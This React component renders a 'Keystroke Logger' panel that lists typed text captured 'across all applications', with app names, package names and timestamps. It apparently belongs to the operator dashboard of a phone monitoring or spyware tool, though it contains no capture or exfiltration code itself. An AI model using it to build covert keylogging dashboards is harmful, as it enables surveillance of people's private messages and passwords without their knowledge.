import React from 'react';
import { Keyboard, Clock } from 'lucide-react';

function KeylogList({ keylogs = [] }) {
  const formatTime = (timestamp) => {
    const date = new Date(timestamp < 10000000000 ? timestamp * 1000 : timestamp);
    return date.toLocaleString();
  };

  return (
    <div className="bg-white rounded-3xl shadow-sm border border-slate-200 overflow-hidden animate-in fade-in duration-500">
      <div className="p-8 border-b border-slate-100 flex justify-between items-center">
        <div>
          <h3 className="text-xl font-bold text-slate-900">Keystroke Logger</h3>
          <p className="text-sm text-slate-500 mt-1 font-medium">Live captured text inputs across all applications</p>
        </div>
        <div className="p-3 bg-indigo-50 rounded-2xl text-indigo-600">
          <Keyboard className="w-6 h-6" />
        </div>
      </div>
      
      <div className="divide-y divide-slate-50 max-h-[600px] overflow-y-auto">
        {keylogs.length === 0 ? (
          <div className="p-20 text-center text-slate-400">
            <Keyboard className="w-12 h-12 mx-auto mb-4 opacity-20" />
            <p className="font-bold tracking-widest text-xs uppercase">No keystrokes recorded yet</p>
          </div>
        ) : (
          keylogs.map((log) => {
            return (
              <div key={log.id} className="p-6 hover:bg-slate-50 transition-colors group">
                <div className="flex items-start">
                  <div className="w-10 h-10 flex-shrink-0 rounded-xl bg-gradient-to-br from-indigo-100 to-purple-100 text-indigo-600 flex items-center justify-center font-bold text-lg shadow-sm">
                    {log.app_name ? log.app_name[0].toUpperCase() : 'K'}
                  </div>
                  <div className="ml-4 flex-1">
                    <div className="flex justify-between items-start">
                      <h4 className="text-sm font-black text-slate-900">{log.app_name || log.package_name}</h4>
                      <span className="text-[10px] font-bold text-slate-400 flex items-center uppercase tracking-widest">
                        <Clock className="w-3 h-3 mr-1" />
                        {formatTime(log.timestamp)}
                      </span>
                    </div>
                    <p className="text-xs font-bold text-slate-400 mt-0.5">{log.package_name}</p>
                    <div className="mt-2 p-3 bg-slate-50 rounded-xl border border-slate-100 text-sm text-slate-800 font-mono break-all">
                      {log.typed_text}
                    </div>
                  </div>
                </div>
              </div>
            );
          })
        )}
      </div>
    </div>
  );
}

export default KeylogList;
